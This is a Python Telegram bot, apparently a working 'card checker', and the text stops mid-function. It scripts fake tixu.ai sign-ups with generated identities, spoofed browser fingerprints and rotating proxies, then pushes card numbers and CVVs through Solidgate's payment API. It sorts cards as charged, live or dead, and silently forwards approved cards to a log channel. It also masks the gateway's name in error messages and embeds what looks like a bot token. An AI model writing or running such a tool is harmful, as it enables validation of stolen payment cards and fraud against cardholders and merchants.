"""
bot.py — Telegram Card Checker | aiogram v3 | tixu.ai + Solidgate
Install: pip install aiogram requests faker
Run:     python bot.py
Commands:
  /chk  4111111111111111|01|26|123
  /mchk
  4111111111111111|01|26|123
  5217295406478580|07|27|074
"""

import asyncio, csv, hashlib, json, logging, os, random, re, string, sys, time, uuid
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")


import requests

try:
    from faker import Faker
    _faker = Faker()
except ImportError:
    _faker = None

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile


# ══════════════════════════════════════════════════════════════
#  CONFIG — set your token & admin ID (or via ENV variables)
# ══════════════════════════════════════════════════════════════
BOT_TOKEN          = os.getenv("BOT_TOKEN", "8273947380:AAFgYZH5cCNvggikMWP3GTl0bSFbp78w3Q4")
ADMIN_ID           = int(os.getenv("ADMIN_ID", "5826246696"))

# ── Approved card log channel ─────────────────────────────────
# All approved CCs are silently forwarded here with full details + submitter mention.
APPROVED_LOG_CHAT  = int(os.getenv("APPROVED_LOG_CHAT", "-1004362917499"))

# ──────────────────────────────────────────────────────────────
# ACCESS CONTROL PERSISTENCE (authorized_users.json)
# ──────────────────────────────────────────────────────────────
AUTH_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "authorized_users.json")

def load_authorized_users() -> set:
    if os.path.exists(AUTH_FILE):
        try:
            with open(AUTH_FILE, "r", encoding="utf-8") as f:
                return set(json.load(f))
        except Exception:
            pass
    return set()

def save_authorized_users(users: set):
    try:
        with open(AUTH_FILE, "w", encoding="utf-8") as f:
            json.dump(list(users), f, indent=2)
    except Exception as e:
        log.error(f"Failed saving {AUTH_FILE}: {e}")

AUTH_USERS = load_authorized_users()

def is_authorized(user_id: int) -> bool:
    if ADMIN_ID and user_id == ADMIN_ID:
        return True
    return user_id in AUTH_USERS

# ──────────────────────────────────────────────────────────────
# GLOBAL PROXY POOL (proxies.json)
# ──────────────────────────────────────────────────────────────
PROXIES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.json")

def normalize_proxy(raw: str) -> str | None:
    raw = raw.strip()
    if not raw:
        return None
    if raw.startswith(("http://", "https://", "socks5://", "socks4://")):
        return raw
    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    return None

def mask_proxy(p: str) -> str:
    match = re.match(r"^(https?|socks5?|socks4)://([^:]+):([^@]+)@(.+)$", p)
    if match:
        proto, user, _, hostport = match.groups()
        return f"{proto}://{user}:***@{hostport}"
    return p

def load_proxies() -> list:
    if os.path.exists(PROXIES_FILE):
        try:
            with open(PROXIES_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return []

def save_proxies(proxies: list):
    try:
        with open(PROXIES_FILE, "w", encoding="utf-8") as f:
            json.dump(proxies, f, indent=2)
    except Exception as e:
        log.error(f"Failed saving {PROXIES_FILE}: {e}")

GLOBAL_PROXIES = load_proxies()

def get_random_proxy() -> str | None:
    if GLOBAL_PROXIES:
        return random.choice(GLOBAL_PROXIES)
    return None

def test_single_proxy(proxy_url: str) -> tuple:
    """Returns (is_live: bool, ip_or_error: str, latency_sec: float)"""
    t0 = time.time()
    try:
        r = requests.get(
            "https://api.ipify.org?format=json",
            proxies={"http": proxy_url, "https": proxy_url},
            timeout=6,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        latency = round(time.time() - t0, 2)
        if r.status_code == 200:
            ip = r.json().get("ip", "Live")
            return True, ip, latency
        return False, f"HTTP {r.status_code}", latency
    except Exception as e:
        return False, "Failed", round(time.time() - t0, 2)

# ══════════════════════════════════════════════════════════════
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logging.getLogger("aiogram.event").setLevel(logging.WARNING)
log = logging.getLogger(__name__)
_pool = ThreadPoolExecutor(max_workers=1000)

# ──────────────────────────────────────────────────────────────
# PER-USER CHECK LOCK & CANCELLATION STATE
# ──────────────────────────────────────────────────────────────
USER_ACTIVE_CHECKS = {}  # { user_id: { "is_cancelled": False, "progress_msg": msg, "queue": asyncio.Queue, "results": list, "stats": dict } }
USER_LAST_RESULTS  = {}  # { user_id: list_of_processed_results }

def is_user_checking(user_id: int) -> bool:
    return user_id in USER_ACTIVE_CHECKS

def acquire_user_check(user_id: int, queue=None, results=None, stats=None):
    USER_ACTIVE_CHECKS[user_id] = {
        "is_cancelled": False,
        "progress_msg": None,
        "queue": queue,
        "results": results if results is not None else [],
        "stats": stats if stats is not None else {},
    }

def release_user_check(user_id: int):
    session = USER_ACTIVE_CHECKS.pop(user_id, None)
    if session and session.get("results"):
        USER_LAST_RESULTS[user_id] = list(session["results"])

def cancel_user_check(user_id: int) -> bool:
    session = USER_ACTIVE_CHECKS.get(user_id)
    if session:
        session["is_cancelled"] = True
        q = session.get("queue")
        if q:
            while not q.empty():
                try:
                    q.get_nowait()
                    q.task_done()
                except Exception:
                    break
        return True
    return False

def is_user_cancelled(user_id: int) -> bool:
    if not user_id:
        return False
    session = USER_ACTIVE_CHECKS.get(user_id)
    return session["is_cancelled"] if session else False

def _sleep_interruptible(seconds: float, user_id: int = None) -> bool:
    """Sleeps in 100ms slices. Returns True if cancelled, False otherwise."""
    end_t = time.time() + seconds
    while time.time() < end_t:
        if is_user_cancelled(user_id):
            return True
        time.sleep(min(0.1, max(0.01, end_t - time.time())))
    return is_user_cancelled(user_id)

def get_cancel_kb(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛑 Cancel Check", callback_data=f"chk_cancel_{user_id}", style="danger")]
    ])

def get_txt_kb(user_id: int, stats: dict, is_done: bool = False) -> InlineKeyboardMarkup:
    charged_count = stats.get("charged", 0)
    insuff_count  = stats.get("insuff", 0)
    live_3d_count = stats.get("live_3d", 0)
    dead_count    = stats.get("dead", 0)
    error_count   = stats.get("error", 0)

    rows = [
        [
            InlineKeyboardButton(text=f"💳 Charged: {charged_count}", callback_data=f"txtdl_{user_id}_charged", style="success"),
            InlineKeyboardButton(text=f"⚠️ Insuff: {insuff_count}", callback_data=f"txtdl_{user_id}_insuff", style="primary"),
        ],
        [
            InlineKeyboardButton(text=f"⚡ 3DS Live: {live_3d_count}", callback_data=f"txtdl_{user_id}_3ds", style="primary"),
            InlineKeyboardButton(text=f"❌ Dead: {dead_count}", callback_data=f"txtdl_{user_id}_dead", style="danger"),
        ],
        [
            InlineKeyboardButton(text=f"💥 Error: {error_count}", callback_data=f"txtdl_{user_id}_error", style="danger"),
        ]
    ]
    if not is_done:
        rows.append([
            InlineKeyboardButton(text="🛑 Cancel Check", callback_data=f"chk_cancel_{user_id}", style="danger")
        ])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ──────────────────────────────────────────────────────────────
# GENERATORS
# ──────────────────────────────────────────────────────────────
def _uuid():      return str(uuid.uuid4())
def _fp():        return hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()
def _ga():        return f"{random.randint(100000000,999999999)}.{int(time.time())}"
def _fb():        return f"fb.1.{int(time.time()*1000)}.{random.randint(10**9,10**10-1)}"
def _res():       return random.choice(["1280x720","1366x768","1920x1080","1440x900"])

def _email():
    if _faker: return _faker.email()
    u = "".join(random.choices(string.ascii_lowercase+string.digits, k=random.randint(6,12)))
    d = random.choice(["gmail.com","yahoo.com","outlook.com","proton.me"])
    return f"{u}@{d}"

def _name():
    if _faker: return _faker.first_name()
    return random.choice(["James","Emma","Oliver","Sophia","William","Ava",
                           "Noah","Isabella","Ethan","Mia","Lucas","Charlotte"])

def _ua():
    v = random.randint(120, 152)
    return (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36")

def _psid(iid):
    segs = ["".join(random.choices(string.hexdigits.lower(), k=n)) for n in [8,5,5,5,12]]
    return f"pf_{''.join(s.upper() for s in segs)}-{iid}"

# ──────────────────────────────────────────────────────────────
# QUIZ
# ──────────────────────────────────────────────────────────────
def _quiz(email, name):
    rng = random.choice
    rating = [{"id":"id-rating-1","value":"Not sure"},{"id":"id-rating-2","value":"Not for me"},
              {"id":"id-rating-3","value":"Maybe"},{"id":"id-rating-4","value":"Sounds good"}]
    yn = [{"id":"id-yes","value":"Yes"},{"id":"id-no","value":"No"}]
    return [
        {"step":0,  "profileKey":"claude_used_before",
         "data": rng([{"id":"yes","value":"YES"},{"id":"no","value":"NO"}]),
         "question":"Have you used Claude before?"},
        {"step":2,  "profileKey":"learning_goal",
         "data": rng([{"id":"id-2-1","value":"Make everyday tasks easier"},
                      {"id":"id-2-2","value":"Learn new skills"},
                      {"id":"id-2-3","value":"Boost my career"},
                      {"id":"id-2-4","value":"Start a business"}]),
         "question":"Learning goal?"},
        {"step":3,  "profileKey":"challenge_intro",
         "data": rng([{"id":"male","value":"Male"},{"id":"female","value":"Female"},{"id":"other","value":"Other"}]),
         "question":"Gender"},
        {"step":5,  "profileKey":"age",
         "data": rng([{"id":"age-18-24","value":"18-24"},{"id":"age-25-34","value":"25-34"},
                      {"id":"age-35-44","value":"35-44"},{"id":"age-45-54","value":"45-54"},{"id":"age-55+","value":"55+"}]),
         "question":"Age?"},
        {"step":6,  "profileKey":"goal",
         "data": rng([{"id":"id-6-1","value":"Get a promotion"},{"id":"id-6-2","value":"Earn more money"},
                      {"id":"id-6-3","value":"More time for family"},{"id":"id-6-4","value":"Travel the world"},
                      {"id":"id-6-5","value":"Level up myself"}]),
         "question":"Main goal?"},
        {"step":7,  "profileKey":"ai_start_uncertainty_agreement", "data":rng(rating), "question":"Uncertain where to start?"},
        {"step":8,  "profileKey":"ai_fall_behind_agreement",        "data":rng(rating), "question":"Worried falling behind?"},
        {"step":9,  "profileKey":"ai_learning_difficulty_agreement","data":rng(rating), "question":"Find AI hard?"},
        {"step":11, "profileKey":"coding_required_belief",          "data":rng(yn),     "question":"Is coding required?"},
        {"step":12, "profileKey":"ai_knowledge_level",
         "data": rng([{"id":"id-12-1","value":"Complete beginner"},{"id":"id-12-2","value":"Know basics"},
                      {"id":"id-12-3","value":"Key concepts"},{"id":"id-12-4","value":"Use AI regularly"}]),
         "question":"Knowledge level?"},
        {"step":13, "profileKey":"ai_tools_used",
         "data": random.sample([{"id":"id-13-1","value":"Gemini"},{"id":"id-13-2","value":"Copilot"},
                                 {"id":"id-13-3","value":"Notion AI"},{"id":"id-13-6","value":"Claude"},
                                 {"id":"id-13-7","value":"ChatGPT"}], k=random.randint(1,3)),
         "question":"Tools used?"},
        {"step":14, "profileKey":"learning_openness", "data":rng(yn), "question":"Open to learning?"},
        {"step":15, "profileKey":"ai_interest_areas",
         "data": random.sample([{"id":"id-15-1","value":"Design & Creativity"},
                                 {"id":"id-15-2","value":"Business & Productivity"},
                                 {"id":"id-15-3","value":"Coding & Development"},
                                 {"id":"id-15-4","value":"Data & Analytics"},
                                 {"id":"id-15-5","value":"Writing & Content"},
                                 {"id":"id-15-6","value":"Marketing & Sales"}], k=random.randint(1,3)),
         "question":"Interest areas?"},
        {"step":17, "profileKey":"ai_work_impact_worry",
         "data": rng([{"id":"id-17-1","value":"Yes"},{"id":"id-17-2","value":"No"}]),
         "question":"Worried AI affects work?"},
        {"step":19, "profileKey":"work_hours_current",
         "data": rng([{"id":"id-19-1","value":"Less than 4 hours"},{"id":"id-19-2","value":"4-6 hours"},
                      {"id":"id-19-3","value":"6-8 hours"},{"id":"id-19-4","value":"More than 8 hours"}]),
         "question":"Current work hours?"},
        {"step":20, "profileKey":"work_hours_target",
         "data": rng([{"id":"id-19-1","value":"Less than 4 hours"},{"id":"id-19-2","value":"4-6 hours"},
                      {"id":"id-19-3","value":"6-8 hours"},{"id":"id-19-4","value":"More than 8 hours"}]),
         "question":"Target work hours?"},
        {"step":21, "profileKey":"annual_income_goal",
         "data": rng([{"id":"id-21-1","value":"$40,000–$60,000"},{"id":"id-21-2","value":"$60,000–$80,000"},
                      {"id":"id-21-3","value":"$80,000–$100,000"},{"id":"id-21-4","value":"$100,000+"}]),
         "question":"Income goal?"},
        {"step":23, "profileKey":"ai_learning_readiness", "data":rng(rating), "question":"Readiness?"},
        {"step":24, "profileKey":"focus_level",            "data":rng(rating), "question":"Focus?"},
        {"step":25, "profileKey":"daily_time_commitment",
         "data": rng([{"id":"id-25-1","value":"5 min a day"},{"id":"id-25-2","value":"10 min a day"},
                      {"id":"id-25-3","value":"15 min a day"},{"id":"id-25-4","value":"30 min a day"}]),
         "question":"Daily time?"},
        {"step":26, "profileKey":"profile_score",
         "data": {"id":"id-1","value":str(random.randint(70,95))},
         "question":"Profile score"},
        {"step":27, "profileKey":"dream_goal",
         "data": rng([{"id":"id-27-1","value":"Own my dream home"},{"id":"id-27-2","value":"Travel freely"},
                      {"id":"id-27-3","value":"Financial freedom"},{"id":"id-27-4","value":"Career success"}]),
         "question":"Dream goal?"},
        {"step":30, "profileKey":"email",         "data":{"id":"email","value":email},  "question":"Email"},
        {"step":31, "profileKey":"first_name",    "data":{"id":"name", "value":name},   "question":"Name"},
        {"step":32, "profileKey":"email_consent",
         "data":rng([{"id":"yes","value":"Yes, keep me updated!"},{"id":"no","value":"No thanks"}]),
         "question":"Email consent"},
    ]

# ──────────────────────────────────────────────────────────────
# CONSTANTS
# ──────────────────────────────────────────────────────────────
TIXU        = "https://tixu.ai"
SG          = "https://form-v2.solidgate.com"
ONBOARDING  = "learning_claude_in"
PRODUCT_ID  = "b38e9ac0-b3e8-46af-88ec-d50deaf59a92"
CURRENCY    = "INR"
LESSON_REMAP= [{"source":504,"target":383},{"source":888,"target":380},
               {"source":905,"target":381},{"source":958,"target":199}]
TERMINAL    = {"approved","declined","failed","settled","settle_ok","void","ORDER_STATUS_VOID",
               "ORDER_STATUS_APPROVED","ORDER_STATUS_SETTLE_OK","ORDER_STATUS_DECLINED","ORDER_STATUS_AUTH_FAILED",
               "ORDER_STATUS_FAIL","ORDER_STATUS_REFUNDED",
               "ORDER_STATUS_3DS_VERIFY","ORDER_STATUS_3DS_REDIRECT","3ds_verify","3ds_redirect"}

# ──────────────────────────────────────────────────────────────
# STATUS LABEL & SANITIZER
# ──────────────────────────────────────────────────────────────
def sanitize_error_message(err_str: str) -> str:
    if not err_str:
        return "Gateway Error"
    s = str(err_str)
    s = re.sub(r"https?://[^\s/]+", "Adyen Provider", s, flags=re.IGNORECASE)
    s = re.sub(r"form-v2\.solidgate\.com|solidgate\.com|solidgate", "Adyen Provider", s, flags=re.IGNORECASE)
    s = re.sub(r"tixu\.ai|tixu", "Adyen Portal", s, flags=re.IGNORECASE)
    s = re.sub(r"HTTPSConnectionPool\(host='[^']+', port=\d+\):?", "Connection Timeout", s, flags=re.IGNORECASE)
    s = re.sub(r"Max retries exceeded with url: [^\s]+", "(Max Retries Exceeded)", s, flags=re.IGNORECASE)
    s = re.sub(r"Expecting value: line \d+ column \d+ \(char \d+\)", "Invalid Gateway Response", s, flags=re.IGNORECASE)
    s = re.sub(r"JSONDecodeError:?", "Invalid JSON", s, flags=re.IGNORECASE)
    s = re.sub(r"solidgate|tixu", "Adyen", s, flags=re.IGNORECASE)
    s = re.sub(r"\s+", " ", s).strip()
    return s if s else "Gateway Error"

def _label(status, code=""):
    if status in ("ORDER_STATUS_APPROVED","approved","ORDER_STATUS_SETTLE_OK","settle_ok","settled"):
        return "✅ APPROVED"
    if status in ("ORDER_STATUS_AUTH_OK", "auth_ok"):
        return "✅ APPROVED [AUTH OK]"
    if code == "3.02":
        return "⚡ LIVE [INSUFFICIENT FUNDS]"
    if "3DS" in str(status).upper() or str(status).lower() in ("3ds_verify","3ds_redirect","3ds_required","challenge_required","redirect","order_status_3ds_verify","order_status_redirect"):
        return "⚡ LIVE [3DS]"
    codes = {"2.06":"❌ CVV MISMATCH","3.08":"❌ DO NOT HONOR",
             "3.10":"❌ SUSPECTED FRAUD","4.09":"❌ ANTIFRAUD","0.01":"❌ GENERAL DECLINE",
             "1.01":"❌ AUTH FAILED","2.01":"❌ CARD EXPIRED","2.02":"❌ INVALID CARD",
             "2.12":"❌ 3DS AUTH FAILED","3.01":"❌ RESTRICTED","3.05":"❌ LOST/STOLEN"}
    return codes.get(code, f"❌ DECLINED ({code})" if code else f"🔄 {status}")

def _safe_req(session, method, url, headers=None, json_data=None, params=None, data=None, user_id=None, max_retries=2):
    for attempt in range(max_retries + 1):
        if is_user_cancelled(user_id):
            return {}, "cancelled"
        try:
            m = method.lower()
            if m == "post":
                resp = session.post(url, headers=headers, json=json_data, data=data, timeout=12)
            elif m == "patch":
                resp = session.patch(url, headers=headers, json=json_data, data=data, timeout=12)
            else:
                resp = session.get(url, headers=headers, params=params, timeout=12)

            if not resp.text:
                return {}, None
            try:
                data_dict = resp.json()
                return data_dict, None
            except (json.JSONDecodeError, ValueError) as je:
                if attempt < max_retries:
                    new_prx = get_random_proxy()
                    if new_prx:
                        session.proxies = {"http": new_prx, "https": new_prx}
                    if _sleep_interruptible(1.0, user_id):
                        return {}, "cancelled"
                    continue
                else:
                    return {}, sanitize_error_message(str(je))
        except Exception as e:
            err_str = str(e)
            is_retryable = (
                "HTTPSConnectionPool" in err_str or
                "Connection" in err_str or
                "Timeout" in err_str or
                "Expecting value" in err_str or
                "column 1" in err_str or
                isinstance(e, (requests.exceptions.RequestException, json.JSONDecodeError, ValueError))
            )
            if attempt < max_retries and is_retryable:
                new_prx = get_random_proxy()
                if new_prx:
                    session.proxies = {"http": new_prx, "https": new_prx}
                if _sleep_interruptible(1.0, user_id):
                    return {}, "cancelled"
                continue
            else:
                return {}, sanitize_error_message(err_str)

# ──────────────────────────────────────────────────────────────
# CORE FLOW
# ──────────────────────────────────────────────────────────────
def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
    if len(exp_year) == 2:
        exp_year = "20" + exp_year

    DEV   = _uuid()
    EMAIL = _email()
    NAME  = _name()
    UA    = _ua()
    FP    = _fp()
    GA    = _ga()
    FB    = _fb()
    RES   = _res()

    s = requests.Session()
    prx = get_random_proxy()
    if prx:
        s.proxies = {"http": prx, "https": prx}
    s.headers.update({"User-Agent": UA, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"})

    TH = {
        "Content-Type": "application/json",
        "Origin": "https://tixu.ai",
        "Referer": f"https://tixu.ai/onboarding/a/{ONBOARDING}/",
        "User-Agent": UA,
        "sec-ch-ua": '"Not=A?Brand";v="99", "Chromium";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "x-dev-id": DEV,
    }
    GH = {
        "Content-Type": "application/json",
        "Origin": "https://form-v2.solidgate.com",
        "Referer": "https://form-v2.solidgate.com/",
        "User-Agent": UA,
        "x-release": "payment-form-v1.577.0",
    }

    res = {"card":card_number,"exp_month":exp_month,"exp_year":exp_year,"cvv":cvv,
           "bin":{}, "status":"ERROR","label":"ERROR","status_type":"error",
           "code":"","msg":"","order_id":"","token":"","mid":"","sub":"",
           "elapsed":0.0}
    _t0 = time.time()

    if is_user_cancelled(user_id):
        res["label"] = "🛑 Cancelled"
        res["status_type"] = "cancelled"
        res["elapsed"] = round(time.time() - _t0, 2)
        return res

    try:
        # Step 0 — create session
        b, err = _safe_req(s, "post", f"{TIXU}/api/onboarding/sessions", headers=TH,
                           json_data={"onboardingId":ONBOARDING,"deviceId":DEV,"gaClientId":GA,
                                     "fbPixelId":FB,"dev_id":DEV,"utm_source":""}, user_id=user_id)
        if err == "cancelled":
            res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res
        SID = (b.get("sessionId") or b.get("session_id") or b.get("id") or f"ses_{_uuid()}")

        if is_user_cancelled(user_id):
            res["label"] = "🛑 Cancelled"
            res["status_type"] = "cancelled"
            res["elapsed"] = round(time.time() - _t0, 2)
            return res

        # Step 2 — quiz
        answers = _quiz(EMAIL, NAME)
        accumulated = []
        for a in answers:
            if is_user_cancelled(user_id):
                res["label"] = "🛑 Cancelled"
                res["status_type"] = "cancelled"
                res["elapsed"] = round(time.time() - _t0, 2)
                return res
            accumulated.append(a)
            _safe_req(s, "patch", f"{TIXU}/api/onboarding/sessions/{SID}", headers=TH,
                      json_data={"answers": accumulated, "lastScreenIdx": a["step"]+1}, user_id=user_id)
            if _sleep_interruptible(random.uniform(0.08, 0.15), user_id):
                res["label"] = "🛑 Cancelled"
                res["status_type"] = "cancelled"
                res["elapsed"] = round(time.time() - _t0, 2)
                return res

        if is_user_cancelled(user_id):
            res["label"] = "🛑 Cancelled"
            res["status_type"] = "cancelled"
            res["elapsed"] = round(time.time() - _t0, 2)
            return res

        # Step 3 — sign-up
        su, err = _safe_req(s, "post", f"{TIXU}/api/auth/sign-up", headers=TH,
                            json_data={"email":EMAIL,"deviceId":DEV,"qs":f"?session_id={SID}&dev_id={DEV}",
                                      "gaClientId":GA,"fbPixelId":FB,"fbClickId":FB,
                                      "onboardingId":ONBOARDING,"firstName":NAME}, user_id=user_id)
        if err == "cancelled":
            res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res
        UPK = su.get("userPublicId","")

        if is_user_cancelled(user_id):
            res["label"] = "🛑 Cancelled"
            res["status_type"] = "cancelled"
            res["elapsed"] = round(time.time() - _t0, 2)
            return res

        # Step 4 — onboarding answers
        _safe_req(s, "post", f"{TIXU}/api/students/onboarding-answers",
                  headers={**TH,"x-lesson-remap":json.dumps(LESSON_REMAP,separators=(",",":")),
                           "Referer":f"{TIXU}/onboarding/a/{ONBOARDING}/30?session_id={SID}&dev_id={DEV}"},
                  json_data={"email":EMAIL,"userId":su.get("userId"),"userPublicId":UPK,"answers":answers}, user_id=user_id)

        # Steps 5 to 11 with 3x retry loop for 0.01 General Decline
        for attempt in range(3):
            if is_user_cancelled(user_id):
                res["label"] = "🛑 Cancelled"
                res["status_type"] = "cancelled"
                res["elapsed"] = round(time.time() - _t0, 2)
                return res

            if attempt > 0:
                new_prx = get_random_proxy()
                if new_prx:
                    s.proxies = {"http": new_prx, "https": new_prx}
                if _sleep_interruptible(random.uniform(0.3, 0.6), user_id):
                    res["label"] = "🛑 Cancelled"
                    res["status_type"] = "cancelled"
                    res["elapsed"] = round(time.time() - _t0, 2)
                    return res

            # Step 5 — device token
            dev, err = _safe_req(s, "get", f"{TIXU}/api/payments/solidgate/form/device", headers=TH,
                                params={"dev_id":DEV,"product_id":PRODUCT_ID,"currency":CURRENCY,
                                        "onboardingId":ONBOARDING,"website":f"tixu.ai/onboarding/{ONBOARDING}",
                                        "device_id":DEV,"fbc":FB,"fbp":FB}, user_id=user_id)
            if err == "cancelled":
                res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res

            PI  = dev.get("partilIntent","")
            SIG = dev.get("signature","")
            MER = dev.get("merchant","")

            if is_user_cancelled(user_id):
                res["label"] = "🛑 Cancelled"
                res["status_type"] = "cancelled"
                res["elapsed"] = round(time.time() - _t0, 2)
                return res

            # Step 7 — intent
            intent_res, err = _safe_req(s, "post", f"{SG}/api/v2/ui/intent",
                                       headers={**GH,"Content-Type":"text/plain;charset=UTF-8",
                                                "Origin":"https://tixu.ai","Referer":"https://tixu.ai/",
                                                "merchant":MER,"signature":SIG},
                                       data=json.dumps({"payment_intent":PI,"version":"v1",
                                                        "sdk_version":"payment-form-v1.577.0",
                                                        "meta":{"is_brand_logo_defined":False,
                                                                "is_framework_sdk_used":True,
                                                                "cdn":["cdn.solidgate.com"],
                                                                "custom_container_id":"solid-payment-form-container_#123"}}), user_id=user_id)
            if err == "cancelled":
                res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res

            intent = intent_res.get("data",{})
            IID  = intent.get("id") or _uuid()
            JWT  = intent.get("token","")
            HOST = intent.get("host","ui1")

            RPC = {**GH,"guid":IID,"Authorization":f"Bearer {JWT}"}

            if is_user_cancelled(user_id):
                res["label"] = "🛑 Cancelled"
                res["status_type"] = "cancelled"
                res["elapsed"] = round(time.time() - _t0, 2)
                return res

            # Step 8 — device tracking
            _safe_req(s, "post", f"{SG}/rpc/{HOST}/provider.payment_form.device_tracking.v1alpha1.DeviceTrackingService/DeviceTracking",
                      headers=RPC,
                      json_data={"intentId":IID,"body":{"fingerprint":_fp(),"userAgent":UA,
                            "browser":"Chrome","browserVersion":"120.0.0.0","os":"Windows","osVersion":"10",
                            "screenPrint":f"Current Resolution: {RES}","colorDepth":"24",
                            "currentResolution":RES,"availableResolution":RES,
                            "isLocalStorage":True,"isSessionStorage":True,"isCookie":True,
                            "timeZone":"+5.5","language":"en-US","isCanvas":True,
                            "rawData":{"thumbmark":_fp()}}}, user_id=user_id)

            # Step 9 — BIN (fetch once)
            if not res["bin"]:
                r_bin, err = _safe_req(s, "post", f"{SG}/rpc/{HOST}/provider.payment_form.additional_fields.v1alpha1.AdditionalFieldsService/GetAdditionalFields",
                                      headers=RPC, json_data={"intentId":IID,"cardNumber":card_number,"additionalFields":[]}, user_id=user_id)
                res["bin"] = {k:v for k,v in r_bin.items() if k in ("country","cardType","bank","cardCategory")}

            if is_user_cancelled(user_id):
                res["label"] = "🛑 Cancelled"
                res["status_type"] = "cancelled"
                res["elapsed"] = round(time.time() - _t0, 2)
                return res

            # Step 10 — pay
            pay, err = _safe_req(s, "post", f"{SG}/api/v2/{HOST}/card/pay/{IID}",
                                headers={**GH,"Authorization":f"Bearer {JWT}"},
                                json_data={"card_exp_month":exp_month,"card_exp_year":exp_year,
                                           "card_number":card_number,"card_cvv":cvv,
                                           "payment_session_id":_psid(IID)}, user_id=user_id)
            if err == "cancelled":
                res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res

            order = pay.get("order",{})
            txn   = pay.get("transaction",{})
            res["order_id"] = order.get("order_id","")
            res["token"]    = txn.get("card_token",{}).get("token","")
            ostatus         = order.get("status","unknown")

            # Step 11 — poll (with 7 extra polls if ORDER_STATUS_AUTH_OK is returned)
            sr = {}
            auth_ok_polls = 0
            for i in range(20):
                if ostatus in TERMINAL or is_user_cancelled(user_id):
                    break
                if ostatus in ("ORDER_STATUS_AUTH_OK", "auth_ok"):
                    auth_ok_polls += 1
                    if auth_ok_polls > 10:
                        break
                elif auth_ok_polls > 0:
                    if ostatus in TERMINAL:
                        break
                elif i >= 8:
                    break

                if _sleep_interruptible(1.5, user_id):
                    res["label"] = "🛑 Cancelled"
                    res["status_type"] = "cancelled"
                    res["elapsed"] = round(time.time() - _t0, 2)
                    return res

                sr, err = _safe_req(s, "post", f"{SG}/rpc/{HOST}/provider.payment_form.status.v1alpha1.StatusService/Status",
                                    headers=RPC, json_data={"intentId":IID}, user_id=user_id)
                if err == "cancelled":
                    res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res
                ostatus = sr.get("order",{}).get("status", ostatus)

            if is_user_cancelled(user_id):
                res["label"] = "🛑 Cancelled"
                res["status_type"] = "cancelled"
                res["elapsed"] = round(time.time() - _t0, 2)
                return res

            # Extract error
            fe = sr.get("error", pay.get("error",{}))
            ec = fe.get("code","")
            raw_msgs = ", ".join(fe.get("messages",[]))
            em = sanitize_error_message(raw_msgs) if raw_msgs else ""
            if not ec:
                for _, t in sr.get("rawResponse",{}).get("transactions",{}).items():
                    te = t.get("error",{})
                    if te.get("code"):
                        raw_te_msgs = ", ".join(te.get("messages",[]))
                        ec = te["code"]; em = sanitize_error_message(raw_te_msgs) if raw_te_msgs else ""; break

            fo = sr.get("order",{})
            is_auth_ok  = ostatus in ("ORDER_STATUS_AUTH_OK", "auth_ok")
            is_approved = ostatus in ("ORDER_STATUS_APPROVED","approved","ORDER_STATUS_SETTLE_OK","settle_ok","settled") or is_auth_ok
            is_insuff   = (ec == "3.02" or "insufficient" in em.lower())

            # 3DS is ONLY true if there is NO decline error code (or it's 3.02) AND 3DS status was returned
            is_3ds = (not ec or ec == "3.02") and (
                "3ds" in ostatus.lower() or 
                ostatus.lower() in ("3ds_verify", "3ds_redirect", "order_status_3ds_verify", "order_status_3ds_redirect") or
                sr.get("action", {}).get("action") in ("3ds_verify", "3ds")
            )

            if is_approved:
                stype = "approved"
            elif is_insuff or is_3ds:
                stype = "live"
            else:
                stype = "declined"

            raw_amt = order.get("amount") or fo.get("amount") or 14900
            curr = order.get("currency") or fo.get("currency") or CURRENCY
            try:
                amt_val = int(raw_amt) / 100 if int(raw_amt) >= 100 else int(raw_amt)
                amt_str = f"{amt_val:g} {curr}"
            except Exception:
                amt_str = f"{raw_amt} {curr}"

            lbl = _label(ostatus, ec)
            if is_3ds and (not lbl or "DECLINED" in lbl or "unknown" in lbl):
                lbl = "⚡ LIVE [3DS]"

            res.update({"status":ostatus,"code":ec,"msg":em,"status_type":stype,
                        "amount":amt_str,
                        "mid":fo.get("midDescriptor", order.get("descriptor","")),
                        "sub":fo.get("subscriptionId", order.get("subscription_id","")),
                        "label":lbl})

            # Exit retry loop if conclusive or not 0.01 / general decline
            if ec != "0.01" and "general decline" not in em.lower():
                break

    except Exception as e:
        if is_user_cancelled(user_id):
            res["label"] = "🛑 Cancelled"
            res["status_type"] = "cancelled"
        else:
            clean_err = sanitize_error_message(str(e))
